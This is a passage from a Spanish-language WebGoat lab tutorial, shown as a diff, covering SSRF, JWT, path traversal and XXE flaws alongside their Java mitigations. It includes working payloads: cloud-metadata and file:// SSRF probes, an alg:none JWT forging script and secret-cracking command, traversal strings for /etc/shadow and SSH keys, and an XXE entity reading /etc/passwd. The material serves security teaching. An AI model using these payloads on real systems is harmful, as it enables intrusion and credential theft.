+5. Re-serializar y re-encodear en Base64
+6. Enviar el token modificado
+```
+
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 3: Insecure Deserialization — Gadget Chain Execution</div>
+<svg viewBox="0 0 600 240" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">Insecure Deserialization — Gadget Chain</text>
+<rect x="20" y="35" width="140" height="35" rx="6" fill="#ef4444"/><text x="90" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Crafted Payload</text><text x="90" y="63" text-anchor="middle" fill="#fca5a5" font-size="9">Serialized gadget chain</text>
+<polygon points="160,52 190,52 185,47 190,57" fill="#94a3b8"/>
+<rect x="190" y="35" width="180" height="35" rx="6" fill="#8b5cf6"/><text x="280" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Java Deserialization</text><text x="280" y="63" text-anchor="middle" fill="#c4b5fd" font-size="9">ObjectInputStream.readObject()</text>
+<polygon points="370,52 400,52 395,47 400,57" fill="#94a3b8"/>
+<rect x="400" y="35" width="180" height="35" rx="6" fill="#f59e0b"/><text x="490" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Gadget Chain Executes</text><text x="490" y="63" text-anchor="middle" fill="#fef3c7" font-size="9">Runtime.exec("malicious cmd")</text>
+<line x1="490" y1="70" x2="490" y2="90" stroke="#94a3b8" stroke-width="2"/>
+<rect x="400" y="95" width="180" height="35" rx="6" fill="#10b981"/><text x="490" y="110" text-anchor="middle" fill="white" font-size="11" font-weight="bold">RCE on Server</text><text x="490" y="123" text-anchor="middle" fill="#d1fae5" font-size="9">Arbitrary code execution</text>
+<rect x="20" y="145" width="560" height="45" rx="8" fill="#7f1d1d" stroke="#ef4444"/>
+<text x="300" y="165" text-anchor="middle" fill="#fca5a5" font-size="12" font-weight="bold">Vulnerable: No ObjectInputFilter, accepts any class</text>
+<text x="300" y="182" text-anchor="middle" fill="#e2e8f0" font-size="10">Fix: Use ObjectInputFilter with whitelist of allowed classes</text>
+<rect x="20" y="200" width="560" height="30" rx="6" fill="#1e293b" stroke="#334155"/>
+<text x="300" y="220" text-anchor="middle" fill="#94a3b8" font-size="10">Common gadgets: CommonsCollections, CommonsBeanUtils, SpringAOP, JRE8u20</text>
+</svg>
+</div>
+
+### 🛡️ Cómo mitigarla
+
+**Remediación técnica específica**:
+
+```java
+// ✅ SEGURO — ObjectInputFilter (Java 9+)
+ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
+    // Whitelist de clases permitidas
+    "com.myapp.model.User;" +
+    "com.myapp.model.Product;" +
+    "java.util.*;" +
+    "!*" // Deny everything else
+);
+
+ObjectInputStream ois = new ObjectInputStream(inputStream);
+ois.setObjectInputFilter(filter);
+Object obj = ois.readObject();
+
+// ✅ MEJOR — Evitar Java serialization completamente
+// Usar JSON (Jackson, Gson) o Protocol Buffers en lugar de Java serialization
+// JSON no ejecuta código durante la deserialización
+
+// ✅ ALTERNATIVA — Si debes usar serialization, validar antes
+// 1. Firmar datos serializados con HMAC
+// 2. Verificar la firma antes de deserializar
+// 3. Usar ObjectInputFilter como defensa en profundidad
+```
+
+**Capas de defensa**:
+
+| Capa | Técnica | Efectividad |
+|------|---------|-------------|
+| **Primaria** | ObjectInputFilter con whitelist | ~100% |
+| **Secundaria** | Evitar Java serialization (usar JSON) | Muy alta |
+| **Terciaria** | Firmar datos serializados (HMAC) | Alta |
+| **Dependency** | Actualizar librerías (no gadget chains) | Alta |
+| **Runtime** | Security manager / sandbox | Media |
+
+---
+
+## 4. SSRF — Lesson: Server-Side Request Forgery
+
+### 🎯 Qué es
+
+SSRF (Server-Side Request Forgery) permite a un atacante hacer que el servidor realice peticiones HTTP a URLs controladas por el atacante o a recursos internos. En WebGoat, las lecciones de SSRF demuestran cómo un servidor puede ser engañado para acceder a recursos internos que no son accesibles desde el exterior.
+
+**OWASP Top 10**: A10:2021 — Server-Side Request Forgery
+**CWE**: CWE-918 — Server-Side Request Forgery
+**MITRE ATT&CK**: T1190 — Exploit Public-Facing Application
+
+### 🔧 Cómo funciona
+
+```java
+// WebGoat — código vulnerable (simplificado)
+// SSRF.java
+String url = request.getParameter("url");
+URL target = new URL(url);
+URLConnection conn = target.openConnection();
+// El servidor hace la petición a cualquier URL que el atacante proporcione
+```
+
+El atacante puede usar SSRF para:
+- Acceder a servicios internos (metadata clouds, localhost services)
+- Escanear puertos internos
+- Acceder a bases de datos internas
+- Leer archivos locales (`file:///`)
+
+### ⏰ Cuándo ocurre
+
+- Cuando el servidor hace peticiones HTTP basadas en input del usuario
+- Cuando NO hay whitelist de dominios permitidos
+- Cuando NO se validan las URLs antes de hacer la petición
+- En features como: webhook URLs, URL preview, image fetchers, PDF generators
+
+### 📍 Dónde se encuentra
+
+En WebGoat: **SSRF lesson** (`/WebGoat/SSRF`)
+
+La lección pide que accedas a un recurso interno que no es accesible desde el exterior.
+
+### ❓ Por qué existe
+
+**Causa raíz**: Sin validación de URL:
+
+```java
+// ❌ VULNERABLE — Acepta cualquier URL
+String url = request.getParameter("url");
+URL target = new URL(url);
+URLConnection conn = target.openConnection();
+
+// ✅ SEGURO — Whitelist de dominios permitidos
+String url = request.getParameter("url");
+URL target = new URL(url);
+
+// Verificar que el dominio está en la whitelist
+String host = target.getHost();
+if (!ALLOWED_DOMAINS.contains(host)) {
+    throw new SecurityException("Domain not allowed: " + host);
+}
+
+// Verificar que no es una IP interna
+InetAddress addr = InetAddress.getByName(host);
+if (addr.isSiteLocalAddress() || addr.isLoopbackAddress()) {
+    throw new SecurityException("Internal addresses not allowed");
+}
+
+URLConnection conn = target.openConnection();
+```
+
+### 🚀 Para qué se explota
+
+**Impacto del atacante**:
+
+| Objetivo | Resultado | Impacto |
+|----------|-----------|---------|
+| Cloud metadata | Acceder a `http://169.254.169.254/` | Credenciales cloud |
+| Internal services | Acceder a servicios en la red interna | Reconocimiento |
+| Port scanning | Descubrir servicios internos | Reconocimiento |
+| File read | `file:///etc/passwd` | Información del sistema |
+
+### 🔍 Cómo buscarla
+
+**Metodología**:
+
+```
+PASO 1: Identificar features que hacen peticiones externas
+  ├── URL preview, webhook registration
+  ├── Image fetching, PDF generation
+  ├── API proxy, URL redirectors
+  └── Cualquier feature que tome una URL como input
+
+PASO 2: Probar URLs internas
+  ├── http://localhost:8080/admin
+  ├── http://127.0.0.1:3306 (MySQL)
+  ├── http://169.254.169.254/latest/meta-data/ (AWS)
+  └── file:///etc/passwd
+
+PASO 3: Verificar respuesta
+  ├── ¿Devuelve contenido del servicio interno? → Vulnerable
+  └── ¿Error de conexión o bloqueo? → Probablemente seguro
+```
+
+### 💥 Cómo explotarla
+
+**Fundamento técnico**: El servidor actúa como un proxy no intencional. Cuando el atacante proporciona una URL interna, el servidor (que tiene acceso a la red interna) hace la petición y devuelve la respuesta al atacante.
+
+**Explotación paso a paso**:
+
+```bash
+# Paso 1: Ir a la lección SSRF en WebGoat
+# Menú lateral → SSRF
+
+# Paso 2: La lección generalmente pide acceder a un recurso interno
+# que solo es accesible desde el servidor mismo
+
+# Paso 3: Probar URLs internas
+# En el campo de URL, ingresar:
+http://localhost:8080/WebGoat/
+
+# Paso 4: Si funciona, intentar acceder a recursos más sensibles
+http://127.0.0.1:8080/admin
+http://169.254.169.254/latest/meta-data/
+http://localhost:9090/WebWolf/
+
+# Paso 5: En WebGoat, la lección específica puede pedir
+# acceder a un endpoint interno particular
+# Por ejemplo: http://localhost:8080/WebGoat/SSRF/internal
+```
+
+**Con curl**:
+
+```bash
+# Paso 1: Login y obtener cookie
+# (Usar browser para login, copiar JSESSIONID)
+
+# Paso 2: Enviar SSRF via POST
+curl -X POST http://localhost:8080/WebGoat/SSRF/task \
+  -H "Cookie: JSESSIONID=<TU_SESSION_ID>" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "url=http%3A%2F%2Flocalhost%3A8080%2FWebGoat%2FSSRF%2Finternal"
+
+# URL-decoded: url=http://localhost:8080/WebGoat/SSRF/internal
+```
+
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 4: SSRF — Server as Unintended Proxy</div>
+<svg viewBox="0 0 600 220" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">SSRF — Server-Side Request Forgery</text>
+<rect x="20" y="35" width="120" height="35" rx="6" fill="#ef4444"/><text x="80" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Attacker</text><text x="80" y="63" text-anchor="middle" fill="#fca5a5" font-size="9">url=http://internal</text>
+<polygon points="140,52 180,52 175,47 180,57" fill="#94a3b8"/>
+<rect x="180" y="35" width="140" height="35" rx="6" fill="#3b82f6"/><text x="250" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">WebGoat Server</text><text x="250" y="63" text-anchor="middle" fill="#dbeafe" font-size="9">Makes request to URL</text>
+<polygon points="320,52 360,52 355,47 360,57" fill="#94a3b8"/>
+<rect x="360" y="35" width="140" height="35" rx="6" fill="#10b981"/><text x="430" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Internal Service</text><text x="430" y="63" text-anchor="middle" fill="#d1fae5" font-size="9">localhost:8080/admin</text>
+<polygon points="360,70 180,70 185,65 180,75" fill="#94a3b8" stroke-dasharray="4,2"/>
+<text x="270" y="65" text-anchor="middle" fill="#e2e8f0" font-size="9">Returns internal response to attacker</text>
+<rect x="20" y="95" width="560" height="45" rx="8" fill="#7f1d1d" stroke="#ef4444"/>
+<text x="300" y="115" text-anchor="middle" fill="#fca5a5" font-size="12" font-weight="bold">Server has access to internal network — attacker doesn't</text>
+<text x="300" y="132" text-anchor="middle" fill="#e2e8f0" font-size="10">SSRF bypasses network boundaries via server's trusted position</text>
+<rect x="20" y="155" width="560" height="55" rx="8" fill="#1e293b" stroke="#334155"/>
+<text x="30" y="175" fill="#94a3b8" font-size="11">Common SSRF targets:</text>
+<text x="30" y="195" fill="#e2e8f0" font-family="monospace" font-size="10">http://169.254.169.254/ (cloud metadata) | http://localhost:3306 (MySQL) | file:///etc/passwd</text>
+</svg>
+</div>
+
+### 🛡️ Cómo mitigarla
+
+**Remediación técnica específica**:
+
+```java
+// ✅ SEGURO — Whitelist + validación de red
+public String fetchUrl(String userUrl) throws Exception {
+    URL url = new URL(userUrl);
+
+    // 1. Whitelist de dominios permitidos
+    Set<String> allowedDomains = Set.of("api.example.com", "cdn.example.com");
+    if (!allowedDomains.contains(url.getHost())) {
+        throw new SecurityException("Domain not allowed: " + url.getHost());
+    }
+
+    // 2. Verificar que no es una IP interna
+    InetAddress addr = InetAddress.getByName(url.getHost());
+    if (addr.isSiteLocalAddress() || addr.isLoopbackAddress()) {
+        throw new SecurityException("Internal addresses not allowed");
+    }
+
+    // 3. Verificar que el protocolo es HTTP/HTTPS (no file://, gopher://)
+    String protocol = url.getProtocol();
+    if (!protocol.equals("http") && !protocol.equals("https")) {
+        throw new SecurityException("Only HTTP/HTTPS allowed");
+    }
+
+    // 4. Hacer la petición
+    return fetchWithTimeout(url, 5000);
+}
+
+// ✅ MEJOR — Usar un allowlist de URLs predefinidas
+// En lugar de aceptar URLs arbitrarias, usar un mapa de IDs a URLs
+Map<String, String> allowedUrls = Map.of(
+    "weather", "https://api.weather.com/current",
+    "news", "https://api.news.com/headlines"
+);
+String url = allowedUrls.get(userInput);
+if (url == null) throw new SecurityException("Invalid URL ID");
+```
+
+**Capas de defensa**:
+
+| Capa | Técnica | Efectividad |
+|------|---------|-------------|
+| **Primaria** | Whitelist de dominios permitidos | ~100% |
+| **Secundaria** | Bloquear IPs internas (isSiteLocalAddress) | Alta |
+| **Terciaria** | Restringir protocolos (solo HTTP/HTTPS) | Alta |
+| **Network** | Network segmentation | Reduce impacto |
+| **Cloud** | IMDSv2 (AWS metadata service v2) | Alta |
+
+---
+
+## 5. JWT Attacks — Lesson: JWT Tokens
+
+### 🎯 Qué es
+
+JWT (JSON Web Token) attacks involucran la manipulación de tokens JWT para obtener acceso no autorizado. WebGoat tiene lecciones específicas sobre JWT que cubren: token decoding, algorithm confusion (`alg:none`), weak secrets, y claim manipulation.
+
+**OWASP Top 10**: A02:2021 — Cryptographic Failures
+**CWE**: CWE-347 — Insufficient Verification of Data Authenticity
+**MITRE ATT&CK**: T1550.001 — Use Alternate Authentication Material
+
+### 🔧 Cómo funciona
+
+Un JWT tiene tres partes:
+
+```
+Header.Payload.Signature
+```
+
+```json
+// Header
+{"alg": "HS256", "typ": "JWT"}
+
+// Payload
+{"sub": "user123", "role": "USER", "iat": 1234567890}
+
+// Signature
+HMACSHA256(base64Url(header) + "." + base64Url(payload), secret)
+```
+
+Los ataques comunes incluyen:
+- **alg:none**: Cambiar el algoritmo a "none" para eliminar la firma
+- **Weak secret**: Forzar la clave secreta con diccionario
+- **Claim manipulation**: Cambiar claims como `"role": "USER"` a `"role": "ADMIN"`
+
+### ⏰ Cuándo ocurre
+
+- Cuando el servidor acepta el algoritmo `none` como válido
+- Cuando el secret es débil y puede ser crackeado
+- Cuando NO se valida el algoritmo esperado
+- Cuando los claims no se verifican en el servidor
+
+### 📍 Dónde se encuentra
+
+En WebGoat: **JWT lesson** (`/WebGoat/Jwt`)
+
+Las lecciones incluyen:
+- **JWT Lesson 1**: Decoding JWT — entender la estructura
+- **JWT Lesson 2**: JWT signing — crear tokens válidos
+- **JWT Lesson 3**: JWT validation — bypass de validación
+- **JWT Lesson 4**: JWT refresh token attacks
+
+### ❓ Por qué existe
+
+**Causa raíz**: Validación insuficiente del token:
+
+```java
+// ❌ VULNERABLE — Acepta cualquier algoritmo del token
+JwtParser parser = Jwts.parser()
+    .setSigningKeyResolver(new SigningKeyResolverAdapter() {
+        @Override
+        public byte[] resolveSigningKey(JwsHeader header, Claims claims) {
+            // Usa el algoritmo que dice el header del token
+            // Si dice "none", no verifica firma
+            return secretKey;
+        }
+    });
+
+// ✅ SEGURO — Forzar algoritmo específico
+JwtParser parser = Jwts.parserBuilder()
+    .setSigningKey(secretKey)
+    .requireIssuer("webgoat")
+    .build();
+// Solo acepta tokens firmados con HS256 y el secret correcto
+```
+
+### 🚀 Para qué se explota
+
+**Impacto del atacante**:
+
+| Objetivo | Resultado |
+|----------|-----------|
+| Escalación de privilegios | Cambiar `"role": "USER"` a `"role": "ADMIN"` |
+| Suplantación de identidad | Cambiar `"sub"` a otro usuario |
+| Bypass de autenticación | Token con `alg:none` sin firma |
+| Acceso prolongado | Manipular `exp` claim para extender validez |
+
+### 🔍 Cómo buscarla
+
+**Metodología**:
+
+```
+PASO 1: Identificar uso de JWT
+  ├── Headers: Authorization: Bearer <token>
+  ├── Cookies: access_token=<jwt>
+  └── Response bodies: {"token": "..."}
+
+PASO 2: Decodificar el token
+  ├── Ir a jwt.io
+  ├── Pegar el token
+  └── Analizar header, payload, signature
+
+PASO 3: Probar ataques
+  ├── Cambiar alg a "none"
+  ├── Modificar claims (role, admin, etc.)
+  ├── Crackear secret con jwt_tool
+  └── Enviar token modificado
+```
+
+### 💥 Cómo explotarla
+
+**Fundamento técnico**: JWT usa Base64Url encoding. El atacante puede decodificar, modificar el payload, y re-encodear. Si el servidor no verifica adecuadamente la firma, acepta el token modificado.
+
+**Explotación paso a paso**:
+
+```bash
+# Paso 1: Ir a la lección JWT en WebGoat
+# Menú lateral → JWT → JWT Lesson 1
+
+# Paso 2: Decodificar el token proporcionado
+# Copiar el token y pegarlo en jwt.io
+
+# Paso 3: Para alg:none attack
+# Modificar el header:
+# {"alg":"none","typ":"JWT"}
+
+# Modificar el payload:
+# {"admin":"true","user":"Tom"}
+
+# Eliminar la signature (dejar vacía)
+
+# Construir token:
+# base64url(header).base64url(payload).
+
+# Paso 4: Enviar token modificado
+# En el campo de la lección, pegar el token manipulado
+
+# Paso 5: Para weak secret attack
+# Usar jwt_tool para crackear el secret
+pip3 install jwt_tool
+python3 jwt_tool.py <TOKEN> -d /usr/share/wordlists/rockyou.txt
+```
+
+**Con curl**:
+
+```bash
+# Paso 1: Crear token con alg:none
+HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
+PAYLOAD=$(echo -n '{"admin":"true","user":"Tom"}' | base64 | tr '+/' '-_' | tr -d '=')
+TOKEN="${HEADER}.${PAYLOAD}."
+
+# Paso 2: Enviar token
+curl -X POST http://localhost:8080/WebGoat/Jwt/decode \
+  -H "Cookie: JSESSIONID=<TU_SESSION_ID>" \
+  -H "Content-Type: application/json" \
+  -d "{\"token\":\"${TOKEN}\"}"
+```
+
+**Script Python para automatizar**:
+
+```python
+#!/usr/bin/env python3
+"""JWT alg:none attack — educativo"""
+import base64
+import json
+import requests
+
+def base64url_encode(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+# Header con alg:none
+header = {"alg": "none", "typ": "JWT"}
+header_b64 = base64url_encode(json.dumps(header).encode())
+
+# Payload como admin
+payload = {"admin": "true", "user": "Tom"}
+payload_b64 = base64url_encode(json.dumps(payload).encode())
+
+# Token sin signature
+token = f"{header_b64}.{payload_b64}."
+
+# Enviar request
+resp = requests.post(
+    "http://localhost:8080/WebGoat/Jwt/decode",
+    headers={"Cookie": "JSESSIONID=<TU_SESSION_ID>"},
+    json={"token": token}
+)
+
+print(f"Status: {resp.status_code}")
+print(f"Response: {resp.text}")
+```
+
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 5: JWT Token Structure and Attack Vectors</div>
+<svg viewBox="0 0 600 200" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">JWT Structure — Attack Vectors</text>
+<rect x="20" y="35" width="170" height="150" rx="8" fill="#1e3a5f" stroke="#3b82f6" stroke-width="2"/>
+<text x="105" y="55" text-anchor="middle" fill="#93c5fd" font-size="13" font-weight="bold">Header</text>
+<text x="30" y="75" fill="#e2e8f0" font-family="monospace" font-size="10">{"alg":"HS256"}</text>
+<text x="30" y="92" fill="#e2e8f0" font-family="monospace" font-size="10">{"typ":"JWT"}</text>
+<text x="30" y="115" fill="#ef4444" font-size="9">⚠ Attack: alg:none</text>
+<text x="30" y="130" fill="#ef4444" font-size="9">⚠ Attack: alg:HS256→RS256</text>
+<rect x="210" y="35" width="180" height="150" rx="8" fill="#451a03" stroke="#f59e0b" stroke-width="2"/>
+<text x="300" y="55" text-anchor="middle" fill="#fcd34d" font-size="13" font-weight="bold">Payload</text>
+<text x="220" y="75" fill="#e2e8f0" font-family="monospace" font-size="10">{"sub":"user123"}</text>
+<text x="220" y="92" fill="#e2e8f0" font-family="monospace" font-size="10">{"role":"USER"}</text>
+<text x="220" y="109" fill="#e2e8f0" font-family="monospace" font-size="10">{"admin":false}</text>
+<text x="220" y="130" fill="#ef4444" font-size="9">⚠ Attack: role→ADMIN</text>
+<text x="220" y="145" fill="#ef4444" font-size="9">⚠ Attack: admin→true</text>
+<rect x="410" y="35" width="170" height="150" rx="8" fill="#1a3a2a" stroke="#10b981" stroke-width="2"/>
+<text x="495" y="55" text-anchor="middle" fill="#6ee7b7" font-size="13" font-weight="bold">Signature</text>
+<text x="420" y="80" fill="#e2e8f0" font-family="monospace" font-size="9">HMACSHA256(</text>
+<text x="420" y="97" fill="#e2e8f0" font-family="monospace" font-size="9">  header.payload,</text>
+<text x="420" y="114" fill="#e2e8f0" font-family="monospace" font-size="9">  secret</text>
+<text x="420" y="131" fill="#e2e8f0" font-family="monospace" font-size="9">)</text>
+<text x="420" y="155" fill="#ef4444" font-size="9">⚠ Attack: weak secret</text>
+<text x="195" y="110" fill="#64748b" font-size="20">.</text>
+<text x="395" y="110" fill="#64748b" font-size="20">.</text>
+</svg>
+</div>
+
+### 🛡️ Cómo mitigarla
+
+**Remediación técnica específica**:
+
+```java
+// ✅ SEGURO — Validación estricta de JWT
+JwtParser parser = Jwts.parserBuilder()
+    .setSigningKey(secretKey)
+    // Forzar algoritmo — NO aceptar lo que dice el token
+    .requireAlgorithm(SignatureAlgorithm.HS256)
+    // Validar claims obligatorios
+    .requireIssuer("webgoat")
+    .requireAudience("webgoat-users")
+    // Validar expiración
+    .setAllowedClockSkewSeconds(30)
+    .build();
+
+try {
+    Jws<Claims> jws = parser.parseClaimsJws(token);
+    Claims claims = jws.getBody();
+
+    // Verificar claims de autorización
+    if (!"ADMIN".equals(claims.get("role"))) {
+        throw new SecurityException("Insufficient privileges");
+    }
+} catch (JwtException e) {
+    throw new SecurityException("Invalid token", e);
+}
+
+// ✅ MEJOR — Usar RS256 (asimétrico) en producción
+// HS256: misma clave para firmar y verificar
+// RS256: clave privada firma, pública verifica
+```
+
+**Capas de defensa**:
+
+| Capa | Técnica | Efectividad |
+|------|---------|-------------|
+| **Primaria** | Forzar algoritmo específico (`requireAlgorithm`) | ~100% |
+| **Secundaria** | Usar RS256 en lugar de HS256 | Alta |
+| **Terciaria** | Validar claims (exp, iss, aud, role) | Alta |
+| **Secret** | Secret fuerte (256+ bits, random) | Alta |
+| **Rotación** | Rotar secret periódicamente | Reduce ventana |
+
+---
+
+## 6. Path Traversal — Lesson: Path Traversal
+
+### 🎯 Qué es
+
+Path Traversal permite a un atacante acceder a archivos fuera del directorio previsto manipulando la ruta del archivo. En WebGoat, las lecciones de Path Traversal demuestran cómo secuencias como `../` pueden escapar del directorio base.
+
+**OWASP Top 10**: A01:2021 — Broken Access Control
+**CWE**: CWE-22 — Improper Limitation of a Pathname to a Restricted Directory
+**MITRE ATT&CK**: T1083 — File and Directory Discovery
+
+### 🔧 Cómo funciona
+
+```java
+// WebGoat — código vulnerable (simplificado)
+// PathTraversal.java
+String fileName = request.getParameter("filename");
+Path path = Paths.get(BASE_DIR, fileName);
+// Si fileName = "../../../etc/passwd"
+// path = /base/dir/../../../etc/passwd = /etc/passwd
+```
+
+La secuencia `../` significa "directorio padre" en sistemas Unix. Múltiples `../` permiten subir varios niveles en el árbol de directorios.
+
+### ⏰ Cuándo ocurre
+
+- Cuando la aplicación sirve archivos basados en input del usuario
+- Cuando NO valida que la ruta resultante está dentro del directorio permitido
+- Cuando NO usa `Path.normalize()` + verificación de prefijo
+- Cuando el web server no restringe el acceso a directorios fuera del webroot
+
+### 📍 Dónde se encuentra
+
+En WebGoat: **Path Traversal lesson** (`/WebGoat/PathTraversal`)
+
+La lección presenta un formulario para seleccionar archivos que deberían estar limitados a un directorio específico.
+
+### ❓ Por qué existe
+
+**Causa raíz**: Sin validación de path:
+
+```java
+// ❌ VULNERABLE — Sin validación
+String fileName = request.getParameter("filename");
+Path path = Paths.get(BASE_DIR, fileName);
+return Files.readString(path);
+
+// ✅ SEGURO — Validar path normalizado
+String fileName = request.getParameter("filename");
+Path basePath = Paths.get(BASE_DIR).toRealPath();
+Path requestedPath = basePath.resolve(fileName).normalize().toRealPath();
+
+// Verificar que el path está dentro del directorio base
+if (!requestedPath.startsWith(basePath)) {
+    throw new SecurityException("Path traversal attempt detected");
+}
+
+return Files.readString(requestedPath);
+```
+
+### 🚀 Para qué se explota
+
+**Impacto del atacante**:
+
+| Archivo | Información expuesta | Riesgo |
+|---------|---------------------|--------|
+| `/etc/passwd` | Usuarios del sistema | Alto |
+| `/etc/shadow` | Hashes de contraseñas | Crítico |
+| `application.properties` | Config de la app, DB creds | Crítico |
+| `.env` | Variables de entorno, secrets | Crítico |
+| `id_rsa` | SSH private keys | Crítico |
+
+### 🔍 Cómo buscarla
+
+**Metodología**:
+
+```
+PASO 1: Identificar endpoints de archivos
+  ├── /download/, /files/, /static/
+  ├── Parámetros: ?file=, ?path=, ?filename=
+  └── URLs con extensiones: .pdf, .txt, .json
+
+PASO 2: Probar traversal básico
+  ├── ?filename=../application.properties
+  ├── ?filename=../../etc/passwd
+  └── ?filename=....//....//etc/passwd (evasión)
+
+PASO 3: Probar codificaciones
+  ├── URL encoding: %2e%2e%2f = ../
+  ├── Double encoding: %252e%252e%252f
+  └── Unicode: ..%c0%af (UTF-8 overlong)
+```
+
+### 💥 Cómo explotarla
+
+**Fundamento técnico**: El servidor construye la ruta concatenando el directorio base con el input del usuario. Si el input contiene `../`, la ruta resultante puede escapar del directorio base.
+
+**Explotación paso a paso**:
+
+```bash
+# Paso 1: Ir a la lección Path Traversal en WebGoat
+# Menú lateral → Path Traversal
+
+# Paso 2: La lección generalmente pide acceder a un archivo
+# fuera del directorio permitido
+
+# Paso 3: Probar traversal básico
+# En el campo de filename, ingresar:
+../application.properties
+
+# Paso 4: Si funciona, intentar acceder a archivos más sensibles
+../../etc/passwd
+../../../etc/shadow
+
+# Paso 5: En WebGoat, la lección específica puede pedir
+# acceder a un archivo particular como webgoat-container o similar
+```
+
+**Con curl**:
+
+```bash
+# Paso 1: Login y obtener cookie
+# (Usar browser para login, copiar JSESSIONID)
+
+# Paso 2: Enviar path traversal via POST
+curl -X POST http://localhost:8080/WebGoat/PathTraversal/task \
+  -H "Cookie: JSESSIONID=<TU_SESSION_ID>" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "filename=%2e%2e%2F%2e%2e%2Fapplication.properties"
+
+# URL-decoded: filename=../../application.properties
+```
+
+### 🛡️ Cómo mitigarla
+
+**Remediación técnica específica**:
+
+```java
+// ✅ SEGURO — Validación estricta de path
+public String readFile(String fileName) throws IOException {
+    Path basePath = Paths.get("/app/files").toRealPath();
+    Path requestedPath = basePath.resolve(fileName).normalize().toRealPath();
+
+    // 1. Verificar que el path está dentro del directorio base
+    if (!requestedPath.startsWith(basePath)) {
+        throw new SecurityException("Path traversal attempt detected");
+    }
+
+    // 2. Verificar que el archivo existe
+    if (!Files.exists(requestedPath)) {
+        throw new FileNotFoundException("File not found");
+    }
+
+    // 3. Leer el archivo
+    return Files.readString(requestedPath);
+}
+
+// ✅ MEJOR — Usar lista blanca de archivos permitidos
+Set<String> allowedFiles = Set.of("readme.txt", "guide.pdf", "info.json");
+if (!allowedFiles.contains(fileName)) {
+    throw new SecurityException("File not allowed");
+}
+```
+
+**Capas de defensa**:
+
+| Capa | Técnica | Efectividad |
+|------|---------|-------------|
+| **Primaria** | Validar path normalizado dentro de base dir | ~100% |
+| **Secundaria** | Rechazar `..` en input | Alta |
+| **Terciaria** | Lista blanca de archivos | Muy alta |
+| **Infraestructura** | Chroot / container isolation | Alta |
+
+---
+
+## 7. XXE — Lesson: XML External Entity
+
+### 🎯 Qué es
+
+XXE (XML External Entity) injection permite a un atacante inyectar entidades externas en XML que el parser procesa, permitiendo leer archivos locales, hacer peticiones SSRF, o causar DoS. En WebGoat, las lecciones de XXE demuestran cómo parsers XML mal configurados pueden ser explotados.
+
+**OWASP Top 10**: A05:2021 — Security Misconfiguration
+**CWE**: CWE-611 — Improper Restriction of XML External Entity Reference
+**MITRE ATT&CK**: T1190 — Exploit Public-Facing Application
+
+### 🔧 Cómo funciona
+
+```java
+// WebGoat — código vulnerable (simplificado)
+// XXE.java
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+// Sin configurar para desactivar entidades externas
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
+```
+
+El ataque funciona inyectando una DTD (Document Type Definition) con entidades externas:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+```
+
+Cuando el parser procesa este XML, reemplaza `&xxe;` con el contenido de `/etc/passwd`.
+
+### ⏰ Cuándo ocurre
+
+- Cuando el parser XML procesa DTDs y entidades externas
+- Cuando NO se desactiva la carga de entidades externas
+- Cuando se acepta XML de fuentes no confiables
+- En Java: cuando `DocumentBuilderFactory` no configura las propiedades de seguridad
+
+### 📍 Dónde se encuentra
+
+En WebGoat: **XXE lesson** (`/WebGoat/XXE`)
+
+La lección presenta un formulario que acepta XML y lo procesa.
+
+### ❓ Por qué existe
+
+**Causa raíz**: Parser XML sin configuración de seguridad:
+
+```java
+// ❌ VULNERABLE — Parser sin protección XXE
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
+
+// ✅ SEGURO — Parser con protección XXE
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+factory.setExpandEntityReferences(false);
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
+```
+
+### 🚀 Para qué se explota
+
+**Impacto del atacante**:
+
+| Objetivo | Resultado | Impacto |
+|----------|-----------|---------|
+| File read | `file:///etc/passwd` | Información del sistema |
+| SSRF | `http://internal-service:8080/` | Acceso a red interna |
+| DoS | Billion laughs attack | Caída del servidor |
+| Data exfiltration | Enviar datos a servidor del atacante | Pérdida de datos |
+
